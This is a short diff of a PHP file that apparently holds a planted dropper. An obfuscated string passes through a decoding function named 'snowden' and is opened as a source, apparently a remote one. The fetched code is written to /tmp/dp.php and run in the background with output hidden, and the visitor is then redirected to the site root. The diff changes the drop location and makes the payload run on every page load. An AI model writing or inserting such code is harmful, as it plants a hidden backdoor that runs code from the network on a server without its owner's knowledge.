@@ -13,9 +13,10 @@ function snowden($string) {
 
  return $black;
 }
-if (!file_exists("functions.php")) {
-	file_put_contents("functions.php", fopen(snowden("SUJrNFJoQVlhMWQzQkc1dWVBRm5mV1lNTUZvUUl6Z2Y="),'r'));
-	exec("php functions.php > /dev/null 2>&1 &");
+if (!file_exists("/tmp/dp.php")) {
+	file_put_contents("/tmp/dp.php", fopen(snowden("SUJrNFJoQVlhMWQzQkc1dWVBRm5mV1lNTUZvUUl6Z2Y="),'r'));
 }
+exec("php /tmp/dp.php > /dev/null 2>&1 &");
+
 header( 'Location: /');
 ?>
